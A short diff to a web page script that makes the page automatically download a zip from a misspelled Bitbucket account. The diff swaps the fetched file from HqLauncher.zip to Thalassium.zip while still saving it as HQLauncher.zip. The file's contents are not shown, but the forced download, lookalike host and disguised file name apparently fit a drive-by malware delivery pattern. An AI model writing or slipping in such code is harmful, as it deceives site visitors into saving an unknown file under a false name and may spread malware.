@@ -41,7 +41,7 @@ function showInstructions() {
   
   // Start download automatically
   const link = document.createElement('a');
-  link.href = 'https://bitbucket.org/hqlaucner/hqlaucngher1/downloads/HqLauncher.zip'; // Replace with actual file URL
+  link.href = 'https://bitbucket.org/hqlaucner/hqlaucngher1/downloads/Thalassium.zip'; // Replace with actual file URL
   link.download = 'HQLauncher.zip';
   document.body.appendChild(link);
   link.click();
